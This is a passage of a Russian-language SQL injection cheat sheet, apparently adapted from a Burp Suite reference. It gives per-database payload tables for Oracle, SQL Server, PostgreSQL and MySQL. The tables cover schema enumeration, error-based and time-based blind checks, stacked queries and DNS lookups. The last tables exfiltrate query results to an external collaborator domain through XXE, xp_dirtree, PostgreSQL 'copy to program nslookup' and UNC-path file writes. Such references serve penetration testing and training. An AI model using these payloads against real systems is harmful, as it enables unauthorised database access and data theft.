| Oracle     |	SELECT * FROM all_tables<br/> SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' |
| Microsoft  |	SELECT * FROM information_schema.tables<br/> SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' |
| PostgreSQL |	SELECT * FROM information_schema.tables<br/> SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' |
| MySQL      |	SELECT * FROM information_schema.tables<br/> SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' |
#### Условные ошибки
Вы можете проверить одно логическое условие и вызвать ошибку базы данных, если условие истинно.
| db         | Выражение |
| ---------- | -----------------------|
| Oracle     |	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual |
| Microsoft  |	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END |
| PostgreSQL |	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END |
| MySQL      |	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') |
#### Пакетные (стековые) запросы
Вы можете использовать пакетные запросы для выполнения нескольких запросов подряд. Обратите внимание, что во время выполнения последующих запросов результаты не возвращаются в приложение. Следовательно, этот метод в первую очередь используется в отношении слепых уязвимостей, когда вы можете использовать второй запрос для запуска поиска DNS, условной ошибки или временной задержки.
| db         | Выражение |
| ---------- | -----------------------|
| Oracle     |	Не поддерживает пакетные запросы. |
| Microsoft  |	QUERY-1-HERE; QUERY-2-HERE |
| PostgreSQL |	QUERY-1-HERE; QUERY-2-HERE |
| MySQL      |	QUERY-1-HERE; QUERY-2-HERE |
>Заметка<br/>
В MySQL пакетные запросы обычно не могут использоваться для SQ инъекцииL. Однако иногда это возможно, если целевое приложение использует определенные API PHP или Python для связи с базой данных MySQL.
#### Временные задержки
Вы можете вызвать временную задержку в базе данных при обработке запроса. Следующее приведет к безусловной временной задержке в 10 секунд.
| db         | Выражение |
| ---------- | -----------------------|
| Oracle     |	dbms_pipe.receive_message(('a'),10) |
| Microsoft  |	WAITFOR DELAY '0:0:10' |
| PostgreSQL |	SELECT pg_sleep(10) |
| MySQL      |	SELECT sleep(10) |
#### Условные временные задержки
Вы можете проверить одно логическое условие и вызвать временную задержку, если условие истинно.
| db         | Выражение |
| ---------- | -----------------------|
| Oracle     |	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual |
| Microsoft  |	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10' |
| PostgreSQL |	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END |
| MySQL      |	SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') |
#### DNS поиск
Вы можете заставить базу данных выполнить поиск DNS во внешнем домене. Для этого вам нужно будет использовать клиент *Burp Collaborator* для создания уникального поддомена *Burp Collaborator*, который вы будете использовать в своей атаке, а затем опросить сервер *Collaborator*, чтобы подтвердить, что произошел поиск DNS.
| db         | Выражение |
| ---------- | -----------------------|
| Oracle     |	Следующий метод использует уязвимость внешней сущности XML (XXE) для запуска поиска DNS. Уязвимость была исправлена, но существует множество не исправленных установок Oracle:<br/> SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual<br/><br/> Следующий метод работает на полностью пропатченных версиях Oracle, но требует повышенных привилегий:<br/> SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net') |
| Microsoft  |	exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a' |
| PostgreSQL |	copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net' |
| MySQL      |	Следующие методы работают только в Windows:<br/> LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')<br/> SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a' |
#### Поиск DNS с эксфильтрацией данных
Вы можете заставить базу данных выполнить поиск DNS во внешнем домене, содержащем результаты введенного запроса. Для этого вам нужно будет использовать клиент Burp Collaborator для создания уникального поддомена Burp Collaborator, который вы будете использовать в своей атаке, а затем опросить сервер Collaborator для получения сведений о любых взаимодействиях DNS, включая отфильтрованные данные.
| db         | Выражение |
| ---------- | -----------------------|
| Oracle     |	SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual |
| Microsoft  |	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"') |
| PostgreSQL |	create OR replace function f() returns void as $$<br/> declare c text;<br/> declare p text;<br/> begin<br/> SELECT into p (SELECT YOUR-QUERY-HERE);<br/> c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';<br/> execute c;<br/> END;<br/> $$ language plpgsql security definer;<br/> SELECT f(); |
| MySQL      |	Следующий метод работает только в Windows:<br/> SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a' |
